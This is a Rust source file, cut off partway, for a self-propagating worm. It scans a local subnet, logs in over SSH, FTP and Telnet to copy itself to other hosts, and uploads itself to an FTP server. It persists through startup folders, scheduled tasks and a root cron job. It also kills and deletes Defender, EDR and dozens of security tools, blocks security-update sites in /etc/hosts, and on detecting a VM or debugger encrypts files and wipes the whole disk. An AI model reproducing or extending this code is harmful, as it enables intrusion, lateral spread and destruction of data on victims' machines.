use crate::fs::OpenOptions;
use std::env;
use std::fs;
use std::fs::File;
use std::io::{self, Write, Read, BufRead};
use std::net::{TcpListener, TcpStream, ToSocketAddrs, IpAddr, Ipv4Addr};
use std::path::Path;
use std::process::Command;
use std::thread;
use std::time::Duration;
use std::env::consts::OS; // To check the operating system
use std::sync::{Arc, Mutex}; // Add these imports for thread safety
use std::io::{ErrorKind};
use std::iter::repeat_with;
use std::fmt;
use std::collections::HashMap;
use base64::{Engine};
use base64::engine::general_purpose; 
use openssl::error::ErrorStack;
use openssl::symm::{Crypter, Cipher, Mode};
use openssl::rsa::{Rsa}; 
use openssl::rand::rand_bytes;
use ssh2::Session; // Ensure you have the `ssh2` crate in your dependencies
use ftp::FtpStream; // Ensure you have the `rust-ftp` crate in your dependencies
use reqwest::blocking::get; // For synchronous requests
use winapi::shared::minwindef::BOOL;

const PORT: u16 = 9999;
const BUFFER_SIZE: usize = 2048;
const AES_KEY_SIZE: usize = 32;
const AES_IV_SIZE: usize = 16;
const RSA_KEY_SIZE: u32 = 2048;

const ROCKYOU_URL: &str = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt";
const ROCKYOU_PATH: &str = "data/rockyou.txt"; // Local path to save the downloaded file

#[derive(Debug)]
enum WormError {
    OpensslError(ErrorStack),
    IoError(io::Error),
    Base64Error(base64::DecodeError),
    ReqwestError(reqwest::Error),
    FtpError(ftp::FtpError), // Ensure this is included
    ThreadJoinError, // Add this variant for thread join errors
    LoginError(ssh2::Error), // Use ssh2::Error directly
}

impl From<ErrorStack> for WormError {
    fn from(err: ErrorStack) -> WormError {
        WormError::OpensslError(err)
    }
}

impl From<io::Error> for WormError {
    fn from(err: io::Error) -> WormError {
        WormError::IoError(err)
    }
}

impl From<base64::DecodeError> for WormError {
    fn from(err: base64::DecodeError) -> WormError {
        WormError::Base64Error(err)
    }
}

impl From<reqwest::Error> for WormError {
    fn from(err: reqwest::Error) -> WormError {
        WormError::ReqwestError(err)
    }
}

impl From<ftp::FtpError> for WormError {
    fn from(err: ftp::FtpError) -> WormError {
        WormError::IoError(io::Error::new(io::ErrorKind::Other, err.to_string()))
    }
}

impl From<ssh2::Error> for WormError {
    fn from(err: ssh2::Error) -> WormError {
        WormError::LoginError(err) // Adjust this based on your WormError definition
    }
}

impl fmt::Display for WormError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            WormError::OpensslError(err) => write!(f, "OpenSSL error: {}", err),
            WormError::IoError(err) => write!(f, "IO error: {}", err),
            WormError::Base64Error(err) => write!(f, "Base64 error: {}", err),
            WormError::ReqwestError(err) => write!(f, "Reqwest error: {}", err),
            WormError::FtpError(err) => write!(f, "FTP error: {}", err),
            WormError::ThreadJoinError => write!(f, "Thread join error"),
            WormError::LoginError(err) => write!(f, "Login error: {:?}", err),
        }
    }
}

struct WormConfig {
    rsa_key_pair: Rsa<openssl::pkey::Private>,
    aes_key: Vec<u8>,
    iv: Vec<u8>,
}

impl WormConfig {
    fn new() -> Result<Self, WormError> {
        let rsa_key_pair = Rsa::generate(RSA_KEY_SIZE)?;
        let mut aes_key = vec![0u8; AES_KEY_SIZE];
        let mut iv = vec![0u8; AES_IV_SIZE];
        rand_bytes(&mut aes_key)?;
        rand_bytes(&mut iv)?;

        Ok(WormConfig {
            rsa_key_pair,
            aes_key,
            iv,
        })
    }
}

struct AdvancedWorm {
    config: WormConfig,
    should_wipe: bool, // Add a field to track if the system should be wiped
    
}

impl AdvancedWorm {
    fn new(config: WormConfig) -> Self {
        AdvancedWorm { config, should_wipe: false }
    }

    fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, WormError> {
        let cipher = Cipher::aes_256_cbc();
        let mut encrypter = Crypter::new(cipher, Mode::Encrypt, &self.config.aes_key, Some(&self.config.iv))?;
        let mut ciphertext = vec![0u8; plaintext.len() + cipher.block_size()];
        let mut count = encrypter.update(plaintext, &mut ciphertext)?;
        count += encrypter.finalize(&mut ciphertext[count..])?;
        ciphertext.truncate(count);
        Ok([self.config.iv.clone(), ciphertext].concat())
    }

    fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, WormError> {
        let (iv, ciphertext) = ciphertext.split_at(AES_IV_SIZE);
        let cipher = Cipher::aes_256_cbc();
        let mut decrypter = Crypter::new(cipher, Mode::Decrypt, &self.config.aes_key, Some(iv))?;
        let mut plaintext = vec![0u8; ciphertext.len() + cipher.block_size()];
        let mut count = decrypter.update(ciphertext, &mut plaintext)?;
        count += decrypter.finalize(&mut plaintext[count..])?;
        plaintext.truncate(count);
        Ok(plaintext)
    }

    fn communicate(&self, message: &str) -> Result<(), WormError> {
        let mut stream = TcpStream::connect(format!("localhost:{}", PORT))?;
        let encrypted_message = self.encrypt(message.as_bytes())?;
        let encoded_message = general_purpose::STANDARD.encode(&encrypted_message);
        stream.write_all(encoded_message.as_bytes())?;
        Ok(())
    }

    fn listen(&self) -> Result<(), WormError> {
        let listener = TcpListener::bind(format!("localhost:{}", PORT))?;
        for stream in listener.incoming() {
            let mut stream = stream?;
            let mut buffer = vec![0u8; BUFFER_SIZE];
            let size = stream.read(&mut buffer)?;
            let encoded_message = &buffer[..size];
            let encrypted_message = general_purpose::STANDARD.decode(encoded_message)?;
            let decrypted_message = self.decrypt(&encrypted_message)?;
            println!("Received message: {}", String::from_utf8_lossy(&decrypted_message));
        }
        Ok(())
    }

    fn add_to_startup(&self) -> Result<(), WormError> {
        let current_dir = env::current_dir()?;
        let worm_path = current_dir.join("worm.exe"); // Assuming the executable is named "worm.exe"
        let startup_dir = Path::new("C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        let startup_path = startup_dir.join("worm.exe");

        if !startup_path.exists() {
            fs::copy(&worm_path, &startup_path)?;
        }

        Ok(())
    }

    fn create_cron_job(&self) -> Result<(), WormError> {
        if OS == "windows" {
            let task_name = "WormTask";
            let task_command = format!("schtasks /create /tn {} /tr \"{}\\worm.exe\" /sc minute /mo 1", task_name, env::current_dir()?.display());
            Command::new("cmd").args(&["/C", &task_command]).status()?;
        } else {
            let cron_dir = Path::new("/etc/cron.d");
            let cron_path = cron_dir.join("worm");

            if !cron_path.exists() {
                let mut file = fs::File::create(cron_path)?;
                file.write_all(b"* * * * * root /path/to/worm\n")?;
            }
        }
        Ok(())
    }

    fn hide_files(&self) -> Result<(), WormError> {
        let worm_path = env::current_dir()?.join("worm");
        if OS == "windows" {
            Command::new("attrib").arg("+h").arg(worm_path.to_str().unwrap()).status()?;
        } else {
            Command::new("chattr").arg("+i").arg(worm_path.to_str().unwrap()).status()?;
        }
        Ok(())
    }

    fn self_propagate(&self) -> Result<(), WormError> {
        let current_dir = env::current_dir()?;
        let worm_path = current_dir.join("worm");
        
        // Define multiple target directories for propagation
        let target_dirs = vec![
            Path::new("/tmp").join("worm"),
            Path::new("/usr/local/bin").join("worm"),
            Path::new("/home/user/worm").to_path_buf(), // Adjust as necessary
            Path::new("C:\\Program Files\\worm.exe").to_path_buf(), // Add Windows target directory
            Path::new("C:\\Users\\Public\\worm.exe").to_path_buf(), // Add another Windows target directory
        ];
        // Attempt to copy to FTP if anonymous access is available
        let ftp_url = "ftp://anonymous:anonymous@ftp.example.com/worm";
        let _ftp_path = Path::new(ftp_url);
        // Use a proper FTP client to upload the worm
        let mut ftp_stream = FtpStream::connect("ftp.example.com")?;
        ftp_stream.login("anonymous", "anonymous")?;
        // ftp_stream.passive(true)?; // Remove this line if it causes an error
        let mut file = fs::File::open(&worm_path)?; // Open the file
        ftp_stream.put("/worm", &mut file)?; // Upload the worm
        // Copy the worm to each target directory
        for target in &target_dirs {
            if !target.exists() {
                fs::copy(&worm_path, &target)?;
                Command::new("chmod").arg("755").arg(&target).status()?;
            }
        }

        // Optionally, spread to network shares (Windows example)
        if OS == "windows" {
            let network_shares = vec![
                r"\\TARGET_MACHINE\shared_folder", // Replace with actual network share
            ];

            for share in network_shares {
                let target_path = Path::new(share).join("worm.exe");
                if !target_path.exists() {
                    fs::copy(&worm_path, &target_path)?;
                }
            }
        }
        // Logic to enumerate drives and spread to attached storage 
        if OS == "windows" {
            let drives = vec![
                "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\",
            ];

            for drive in drives {
                let target_path = Path::new(drive).join("worm.exe");
                if !target_path.exists() {
                    fs::copy(&worm_path, &target_path)?;
                }
            }
        }

        Ok(())
    }

    fn try_login_with_password(&self, target: &str, username: &str, password: &str) -> Result<bool, WormError> {
        // Attempt SSH login
        let tcp = TcpStream::connect(format!("{}:22", target)).map_err(|e| {
            eprintln!("Failed to connect to {}: {}", target, e);
            WormError::IoError(e)
        })?;
        
        let mut session = Session::new().map_err(|e| WormError::IoError(e.into()))?;
        session.set_tcp_stream(tcp);
        session.handshake().map_err(|e| WormError::IoError(e.into()))?;

        // Attempt to authenticate with the provided username and password
        if session.userauth_password(username, password).is_ok() {
            println!("SSH login successful for {} with password: {}", target, password);
            return Ok(true);
        } else {
            println!("SSH login failed for {} with password: {}", target, password);
        }

        // If SSH fails, you can implement FTP login logic here
        // For demonstration, we will just return false for now
        Ok(false)
    }

    fn exploit(&self) -> Result<(), WormError> {
        // Define services to exploit based on the operating system
        let services: HashMap<&str, fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>> = if OS == "windows" {
            let mut map = HashMap::new();
            map.insert("ssh", AdvancedWorm::exploit_ssh as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("ftp", AdvancedWorm::exploit_ftp as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("telnet", AdvancedWorm::exploit_telnet as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("smb", AdvancedWorm::exploit_smb as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("rdp", AdvancedWorm::exploit_rdp as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map
        } else {
            let mut map = HashMap::new();
            map.insert("ssh", AdvancedWorm::exploit_ssh as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("ftp", AdvancedWorm::exploit_ftp as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("telnet", AdvancedWorm::exploit_telnet as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map.insert("smb", AdvancedWorm::exploit_smb as fn(&AdvancedWorm, &IpAddr) -> Result<(), WormError>);
            map
        };

        // Scan the local network for active IP addresses
        let active_ips = self.scan_local_network(Ipv4Addr::new(192, 168, 1, 0))?;

        for target in active_ips {
            for (service, exploit_fn) in &services {
                println!("Attempting exploit against {} for service {}", target, service);
                
                // Check if the service is available on the target
                if self.is_service_available(&target, service)? {
                    if let Err(e) = exploit_fn(self, &target) {
                        eprintln!("Failed to exploit {} on {}: {}", service, target, e);
                    }
                } else {
                    println!("Service {} is not available on {}", service, target);
                }

                thread::sleep(Duration::from_millis(500)); // Simulate delay between attempts
            }
        }

        Ok(())
    }

    // Example exploitation functions
    fn exploit_ssh(&self, target: &IpAddr) -> Result<(), WormError> {
        println!("Exploiting SSH on {}", target);
        
        let tcp = TcpStream::connect(format!("{}:22", target))?;
        let mut session = Session::new().map_err(|e| WormError::IoError(e.into()))?;
        session.set_tcp_stream(tcp);
        session.handshake().map_err(|e| WormError::IoError(e.into()))?;

        // Attempt to authenticate with a username and password
        let username = "username"; // Replace with actual username
        let password = "password"; // Replace with actual password
        if session.userauth_password(username, password).is_ok() {
            println!("SSH login successful for {} with password: {}", target, password);
            // Execute commands or upload files here
        } else {
            println!("SSH login failed for {} with password: {}", target, password);
        }

        Ok(())
    }

    fn exploit_ftp(&self, target: &IpAddr) -> Result<(), WormError> {
        println!("Exploiting FTP on {}", target);
        
        let mut ftp = FtpStream::connect(format!("{}:21", target)).map_err(|e| WormError::FtpError(e))?;
        let username = "anonymous"; // Replace with actual username
        let password = "password"; // Replace with actual password
        ftp.login(username, password).map_err(|e| WormError::FtpError(e))?;
        
        println!("FTP login successful for {}", target);
        // Upload a file or execute FTP commands here
        let mut file = std::fs::File::open("path/to/local/file")?; // Replace with actual file path
        ftp.put("remote_file_name", &mut file).map_err(|e| WormError::FtpError(e))?;
        
        Ok(())
    }

    fn exploit_telnet(&self, target: &IpAddr) -> Result<(), WormError> {
        println!("Exploiting Telnet on {}", target);
        
        let mut tcp = TcpStream::connect(format!("{}:23", target))?;
        let mut stream = io::BufReader::new(tcp.try_clone()?);
        
        // Send login credentials
        let username = "username\r\n"; // Replace with actual username
        let password = "password\r\n"; // Replace with actual password
        tcp.write_all(username.as_bytes())?;
        tcp.write_all(password.as_bytes())?;
        
        // Read response and check for success
        let mut response = String::new();
        stream.read_line(&mut response)?;
        if response.contains("Login successful") {
            println!("Telnet login successful for {}", target);
            // Execute commands or interact with the session here
        } else {
            println!("Telnet login failed for {}", target);
        }

        Ok(())
    }

    fn exploit_smb(&self, target: &IpAddr) -> Result<(), WormError> {
        println!("Exploiting SMB on {}", target);
        
        // Implement SMB exploitation logic here
        // This may involve using a library like `smbclient` or similar
        // Example: Attempt to connect and authenticate
       // let username = "username"; // Replace with actual username
        //let password = "password"; // Replace with actual password
        // Use an SMB library to connect and authenticate
        // Example: smbclient::connect(target, username, password)?;

        Ok(())
    }

    fn exploit_rdp(&self, target: &IpAddr) -> Result<(), WormError> {
        println!("Exploiting RDP on {}", target);
        
        // Implement RDP exploitation logic here
        // This may involve using a library or tool to connect to RDP
        // Example: Attempt to connect and authenticate
        //let username = "username"; // Replace with actual username
        //let password = "password"; // Replace with actual password
        // Use an RDP library or command-line tool to connect and authenticate
        // Example: rdpclient::connect(target, username, password)?;

        Ok(())
    }

    // Function to scan the local network for active IP addresses
    fn scan_local_network(&self, subnet: Ipv4Addr) -> Result<Vec<IpAddr>, WormError> {
        let active_ips = Arc::new(Mutex::new(Vec::new()));
        let mut handles = vec![];

        for i in 1..255 {
            let ip = Ipv4Addr::new(subnet.octets()[0], subnet.octets()[1], subnet.octets()[2], i);
            let active_ips_clone = Arc::clone(&active_ips);

            // Spawn a new thread for each IP scan
            let handle = thread::spawn(move || {
                // Set a timeout for the connection attempt
                let timeout = Duration::from_secs(1);
                match TcpStream::connect_timeout(&format!("{}:22", ip).parse().unwrap(), timeout) {
                    Ok(_) => {
                        active_ips_clone.lock().unwrap().push(IpAddr::V4(ip));
                        println!("Found active IP: {}", ip);
                    }
                    Err(_e) => {
                        eprintln!("Failed to connect to {}", ip); // Log connection failure
                    }
                }
            });

            handles.push(handle);
        }

        // Wait for all threads to complete
        for handle in handles {
            handle.join().map_err(|e| WormError::ThreadJoinError)?; // Handle thread join errors
        }

        let active_ips_clone = active_ips.lock().map_err(|_| WormError::IoError(io::Error::new(io::ErrorKind::Other, "Failed to lock active IPs")))?;
        Ok(active_ips_clone.clone())
    }
    // Function to check if a service is available on the target
    fn is_service_available(&self, target: &IpAddr, service: &str) -> Result<bool, WormError> {
        let port = match service {
            "ssh" => 22,
            "ftp" => 21,
            "telnet" => 23,
            "smb" => 445,
            "rdp" => 3389,
            _ => return Ok(false), // Unknown service
        };

        // Set a timeout for the connection attempt
        let timeout = Duration::from_secs(1);
        match TcpStream::connect_timeout(&format!("{}:{}", target, port).parse().unwrap(), timeout) {
            Ok(_) => {
                println!("Service {} is available on {}", service, target);
                Ok(true) // Service is available
            }
            Err(e) => {
                eprintln!("Service {} is not available on {}: {}", service, target, e); // Log error
                Ok(false) // Service is not available
            }
        }
    }

    // Function to disable Defender and other security-related services
    fn disable_defender(&self, services: Option<Vec<&str>>) -> Result<(), WormError> {
        // List of Defender and other security-related services
        let security_services = services.unwrap_or(vec![
            "MsMpEng.exe",   // Microsoft Defender process
            "WinDefend",     // Microsoft Defender service
            "SecurityHealthService", // Windows Security Health Service
            "WSCService",    // Windows Security Center
        ]);

        for service in &security_services {
            // Check if the service is running before attempting to disable it
            if self.is_service_running(service)? {
                println!("Disabling {}", service);
                self.kill_process(service)?;
                self.stop_service(service)?;
                self.delete_service(service)?;
            } else {
                println!("Service {} is not running.", service);
            }
        }

        println!("Disabled Microsoft Defender and related services");
        Ok(())
    }

    // Helper function to kill a process
    fn kill_process(&self, service: &str) -> Result<(), WormError> {
        if Command::new("taskkill").arg("/F").arg("/IM").arg(service).status().is_err() {
            eprintln!("Failed to kill process: {}", service);
        }
        Ok(())
    }

    // Helper function to stop a service
    fn stop_service(&self, service: &str) -> Result<(), WormError> {
        if Command::new("sc").arg("stop").arg(service).status().is_err() {
            eprintln!("Failed to stop service: {}", service);
        }
        Ok(())
    }

    // Helper function to delete a service
    fn delete_service(&self, service: &str) -> Result<(), WormError> {
        if Command::new("sc").arg("delete").arg(service).status().is_err() {
            eprintln!("Failed to delete service: {}", service);
        }
        Ok(())
    }

    fn is_service_running(&self, service_name: &str) -> Result<bool, WormError> {
        // Check if a service is running by querying the task list
        let output = Command::new("tasklist")
            .arg("/FI")
            .arg(format!("IMAGENAME eq {}", service_name))
            .output()
            .map_err(|e| WormError::IoError(e))?; // Handle command execution errors

        let output_str = String::from_utf8_lossy(&output.stdout).trim().to_string();

        // Check if the output contains the service name and is not empty
        if output_str.is_empty() {
            println!("No output from tasklist for service: {}", service_name);
            return Ok(false);
        }

        // Check if the service is listed in the output
        let is_running = output_str.lines().any(|line| line.contains(service_name));
        Ok(is_running)
    }

    fn unhook_edr(&self) -> Result<(), WormError> {
        // List of EDR services to unhook
        let edr_services = vec!["EDRService", "Sysmon", "EDRAgent"];

        for service in &edr_services {
            if self.is_service_running(service)? {
                println!("Attempting to unhook EDR service: {}", service);

                // Attempt to stop the service with retries
                for attempt in 1..=3 {
                    println!("Stopping {} (Attempt {}/{})", service, attempt, 3);
                    let status = Command::new("sc").arg("stop").arg(service).status();
                    if status.is_ok() {
                        println!("Successfully stopped service: {}", service);
                        break; // Exit retry loop on success
                    } else {
                        println!("Failed to stop service: {} (Attempt {}/{})", service, attempt, 3);
                        thread::sleep(Duration::from_secs(1)); // Wait before retrying
                    }
                }

                // Attempt to delete the service
                let delete_status = Command::new("sc").arg("delete").arg(service).status();
                if delete_status.is_ok() {
                    println!("Successfully deleted service: {}", service);
                } else {
                    println!("Failed to delete service: {}", service);
                }
            } else {
                println!("Service {} is not running, skipping unhook.", service);
            }
        }

        println!("Unhooked EDR services");
        Ok(())
    }

    fn detect_threats(&mut self) {
        // Enhanced detection logic
        if self.is_running_in_vm() || self.is_debugger_attached() {
            self.should_wipe = true;
            println!("Threat detected: initiating system wipe.");
            if let Err(e) = self.encrypt_and_wipe() {
                eprintln!("Error during encryption and wipe: {}", e);
            }
        } else {
            println!("No threats detected.");
        }
    }

    fn encrypt_and_wipe(&self) -> Result<(), WormError> {
        // Encrypt sensitive files before wiping
        let sensitive_files = vec!["/path/to/sensitive/file1", "/path/to/sensitive/file2"]; // Add actual paths
        let encryption_key = b"0123456789abcdef"; // Example key (must be 16, 24, or 32 bytes for AES)
        let cipher = Cipher::aes_256_cbc();

        for file_path in sensitive_files {
            if let Ok(mut file) = File::open(file_path) {
                let mut data = Vec::new();
                file.read_to_end(&mut data)?;

                // Encrypt the data
                let mut encrypter = Crypter::new(cipher, Mode::Encrypt, encryption_key, None)?;
                let mut encrypted_data = vec![0; data.len() + cipher.block_size()];
                let mut count = encrypter.update(&data, &mut encrypted_data)?;
                count += encrypter.finalize(&mut encrypted_data[count..])?;
                encrypted_data.truncate(count);

                // Write encrypted data back to the file (or a new file)
                let mut encrypted_file = File::create(format!("{}.enc", file_path)).map_err(|e| WormError::IoError(e))?;
                encrypted_file.write_all(&encrypted_data).map_err(|e| WormError::IoError(e))?;
                println!("Encrypted file: {}", file_path);
            } else {
                println!("Could not open file for encryption: {}", file_path);
            }
        }

        // Proceed to wipe the system
        self.wipe_system()?;
        Ok(())
    }

    fn is_running_in_vm(&self) -> bool {
        // Check for common VM indicators
        let vm_indicators = vec![
            "VBox", // VirtualBox
            "VMware", // VMware
            "KVM", // KVM
            "QEMU", // QEMU
            "Microsoft Corporation", // Hyper-V
        ];

        // Check for specific files that are often present in VMs
        let vm_files = vec![
            "/sys/class/dmi/id/product_name", // Linux
            "/sys/class/dmi/id/sys_vendor", // Linux
            "/proc/scsi/scsi", // Linux
            "C:\\Program Files\\Oracle\\VirtualBox\\", // Windows
            "C:\\Program Files\\VMware\\VMware Tools\\", // Windows
        ];

        // Check for VM indicators in system information
        for indicator in &vm_indicators {
            let output = Command::new("systeminfo").output().unwrap();
            let output_str = String::from_utf8_lossy(&output.stdout);
            if output_str.contains(indicator) {
                println!("VM detected: {}", indicator);
                return true;
            }
        }

        // Check for specific files
        for file in &vm_files {
            if Path::new(file).exists() {
                println!("VM file detected: {}", file);
                return true;
            }
        }

        false // No VM indicators found
    }

    fn is_debugger_attached(&self) -> bool {
        // Check for common debugger processes
        let debugger_processes = vec![
            "ollydbg.exe",
            "x64dbg.exe",
            "windbg.exe",
            "dbgview.exe",
            "idaq.exe",
        ];

        // Check for running processes
        for process in &debugger_processes {
            let output = Command::new("tasklist").output().expect("Failed to execute tasklist command");
            let output_str = String::from_utf8_lossy(&output.stdout);
            if output_str.contains(process) {
                println!("Debugger detected: {}", process);
                return true;
            }
        }

        // Check for debugger flags in the process
        let is_debugger_present: BOOL = 0; // Remove `mut`

        if is_debugger_present != 0 {
            println!("Debugger attached to the process.");
        }

        false // No debugger detected
    }

    fn wipe_system(&self) -> Result<(), WormError> {
        if self.should_wipe {
            let os = OS.to_string(); // Store OS type for use in threads
            let paths_to_wipe = if os == "windows" {
                vec!["C:\\"]
            } else {
                vec!["/"]
            };

            let handles: Vec<_> = paths_to_wipe.into_iter().map(|path| {
                let os = os.clone();
                thread::spawn(move || {
                    if os == "windows" {
                        // Use a command to wipe the system quickly
                        Command::new("cmd").args(&["/C", "del", "/F", "/Q", &format!("{}*", path)]).status().ok();
                    } else {
                        // Use `shred` for secure deletion on Unix-like systems
                        Command::new("shred").args(&["-n", "3", "-z", "-f", &format!("{}*", path)]).status().ok();
                    }
                })
            }).collect();

            // Wait for all threads to complete
            for handle in handles {
                handle.join().unwrap();
            }

            println!("System wiped. Self-destruct complete.");
        } else {
            println!("No threats detected. System wipe aborted.");
        }
        Ok(())
    }

    fn spread_network(self: &Arc<AdvancedWorm>) -> Result<(), WormError> {
        let self_clone = Arc::clone(self); // No type annotation needed
        let found_targets = Arc::new(Mutex::new(Vec::new())); // To store found targets
        let mut handles = vec![];

        for ip in 1..255 {
            let target = format!("192.168.1.{}", ip);
            let found_targets_clone = Arc::clone(&found_targets);
            let self_clone_clone = Arc::clone(&self_clone); // Clone for use in the thread

            // Spawn a new thread for each IP scan
            let handle = thread::spawn(move || {
                println!("Scanning target: {}", target);
                thread::sleep(Duration::from_millis(100)); // Simulate scanning delay

                // Attempt to connect to common services (e.g., SSH, FTP)
                if self_clone_clone.try_connect_to_service(&target).unwrap_or(false) {
                    println!("Found open service on: {}", target);
                    // Store the found target
                    if let Ok(mut targets) = found_targets_clone.lock() {
                        targets.push(target.clone());
                    } else {
                        eprintln!("Failed to lock found_targets mutex");
                    }
                    // Attempt to propagate the worm
                    if let Err(e) = self_clone_clone.self_propagate_to(&target) {
                        eprintln!("Failed to propagate to {}: {}", target, e);
                    }
                }
            });

            handles.push(handle); // Store the handle
        }

        // Join all handles to ensure all threads complete
        for handle in handles {
            handle.join().map_err(|_| WormError::ThreadJoinError)?; // Handle thread join errors
        }

        Ok(())
    }

    fn try_connect_to_service(&self, target: &str) -> Result<bool, WormError> {
        // Define common ports for services
        let ports = vec![22, 21, 80, 443, 3306]; // 22 for SSH, 21 for FTP, 80 for HTTP, 443 for HTTPS, 3306 for MySQL
        let timeout = Duration::from_secs(2); // Set a timeout of 2 seconds

        for port in ports {
            let address = format!("{}:{}", target, port);
            match TcpStream::connect_timeout(&address.to_socket_addrs()?.next().unwrap(), timeout) {
                Ok(_) => {
                    println!("Successfully connected to {} on port {}", target, port);
                    return Ok(true); // Service is open
                }
                Err(e) => {
                    if e.kind() != ErrorKind::TimedOut {
                        println!("Failed to connect to {} on port {}: {}", target, port, e);
                    } else {
                        println!("Connection to {} on port {} timed out.", target, port);
                    }
                    // Connection failed, try the next port
                    continue;
                }
            }
        }

        println!("No open services found on {}", target);
        Ok(false) // No open services found
    }

    fn self_propagate_to(&self, target: &str) -> Result<(), WormError> {
        // Define the worm executable path
        let worm_executable = "path/to/worm.exe"; // Adjust this path as necessary

        // Attempt SSH propagation
        if let Err(e) = self.propagate_via_ssh(target, worm_executable) {
            eprintln!("SSH propagation failed for {}: {}", target, e);
            // Attempt FTP propagation as a fallback
            if let Err(e) = self.propagate_via_ftp(target, worm_executable) {
                eprintln!("FTP propagation failed for {}: {}", target, e);
            }
        }

        Ok(())
    }

    fn propagate_via_ssh(&self, target: &str, worm_executable: &str) -> Result<(), WormError> {
        // Connect to the target via SSH
        let tcp = TcpStream::connect(format!("{}:22", target))?;
        let mut session = Session::new().map_err(|e| WormError::IoError(e.into()))?;
        session.set_tcp_stream(tcp);
        session.handshake().map_err(|e| WormError::IoError(e.into()))?;

        // Authenticate (replace with actual credentials)
        session.userauth_password("username", "password")?; // Use secure methods for credentials

        if !session.authenticated() {
            return Err(WormError::IoError(io::Error::new(io::ErrorKind::Other, "SSH authentication failed")));
        }

        // Copy the worm executable to the target machine
        let mut remote_file = session.scp_send(Path::new("/tmp/worm.exe"), 0o755, 0, None)?;
        let mut local_file = std::fs::File::open(worm_executable)?;
        io::copy(&mut local_file, &mut remote_file)?;

        println!("Successfully propagated to {} via SSH.", target);
        Ok(())
    }

    fn propagate_via_ftp(&self, target: &str, worm_executable: &str) -> Result<(), WormError> {
        // Attempt to connect to the target via FTP
        println!("Attempting to propagate to {} via FTP...", target);
        
        // Connect to the FTP server
        let mut ftp = FtpStream::connect(format!("{}:21", target)).map_err(|e| {
            eprintln!("Failed to connect to {}: {}", target, e);
            WormError::FtpError(e)
        })?;
        
        // Try anonymous login
        if let Err(e) = ftp.login("anonymous", "user@example.com") {
            eprintln!("Anonymous login failed for {}: {}", target, e);
            // Optionally, you could prompt for username and password here
            return Err(WormError::IoError(io::Error::new(io::ErrorKind::Other, "Anonymous login failed")));
        }
        
        println!("Anonymous login successful for {}", target);

        // Open the worm executable file
        let mut local_file = File::open(worm_executable).map_err(|e| {
            eprintln!("Failed to open worm executable {}: {}", worm_executable, e);
            WormError::IoError(e)
        })?;
        
        let mut file_contents = Vec::new();
        local_file.read_to_end(&mut file_contents).map_err(|e| {
            eprintln!("Failed to read worm executable {}: {}", worm_executable, e);
            WormError::IoError(e)
        })?;

        // Upload the worm executable to the target FTP server
        let remote_path = "/path/to/remote/worm.exe"; // Adjust the remote path as necessary
        ftp.put(remote_path, &mut file_contents.as_slice())?;

        println!("Successfully propagated to {} via FTP.", target);
        Ok(())
    }

    // Function to disable security tools
    fn disable_security_tools(&self) -> Result<(), WormError> {
        let tools = vec![
            "clamav", "maldet", "wireshark", "rkhunter", "chkrootkit", "suricata", 
            "malwarebytes", "avast", "crowdstrike", "falcon", "fail2ban", "ufw", 
            "iptables", "firewalld", "selinux", "apparmor", "auditd", "sysdig", 
            "osquery", "sysmon", "syslog-ng", "logrotate", "logwatch", "auditbeat", 
            "filebeat", "metricbeat", "packetbeat", "heartbeat", "winlogbeat", 
            "journalbeat", "elasticsearch", "kibana", "logstash", "beats", "ossec", 
            "samhain", "aide", "tripwire", "lynis", "tiger", "nessus", "openvas"
        ];

        for tool in &tools {
            if let Err(e) = self.kill_process(tool) {
                eprintln!("Failed to kill process {}: {}", tool, e);
            }
            if let Err(e) = self.uninstall_tool(tool) {
                eprintln!("Failed to uninstall tool {}: {}", tool, e);
            }
            if let Err(e) = self.mask_service(tool) {
                eprintln!("Failed to mask service {}: {}", tool, e);
            }
            println!("Disabled and removed: {}", tool);
        }
        Ok(())
    }

    // Helper function to kill a process
    fn kill_process_by_name(&self, tool: &str) -> Result<(), WormError> {
        Command::new("pkill").arg(tool).status().map_err(|e| WormError::IoError(e))?;
        Ok(())
    }

    // Helper function to uninstall a tool
    fn uninstall_tool(&self, tool: &str) -> Result<(), WormError> {
        Command::new("apt-get")
            .arg("remove")
            .arg("-y")
            .arg(tool)
            .status()
            .map_err(|e| WormError::IoError(e))?;
        Ok(())
    }

    // Helper function to mask a service
    fn mask_service(&self, tool: &str) -> Result<(), WormError> {
        Command::new("systemctl").arg("mask").arg(tool).status().map_err(|e| WormError::IoError(e))?;
        Ok(())
    }

    // Function to block security updates
    fn block_security_updates(&self) -> Result<(), WormError> {
        let domains = vec![
            "clamav.net", "rkhunter.sourceforge.net", "maldet.net", "debian.org/security", 
            "ubuntu.com/security", "redhat.com/security", "centos.org/security", 
            "opensuse.org/security", "fedora.redhat.com/security", "security.debian.org", 
            "security.ubuntu.com", "updates.redhat.com", "updates.centos.org", 
            "updates.opensuse.org", "updates.fedoraproject.org", "avast.com", 
            "malwarebytes.com", "crowdstrike.com", "falcon.crowdstrike.com"
        ];
        let mut file = OpenOptions::new()
            .append(true)
            .open("/etc/hosts")
            .map_err(|e| WormError::IoError(e))?;

        for domain in domains {
            writeln!(file, "127.0.0.1 {}", domain).map_err(|e| WormError::IoError(e))?;
            println!("Blocked security update site: {}", domain);
        }

        Ok(())
    }    // Function to detect security tools
    fn detect_security_tools(&self) -> Result<(), WormError> {
        let tools = vec![
            "clamd", "freshclam", "maldet", "rkhunter", "suricata", "malwarebytes", 
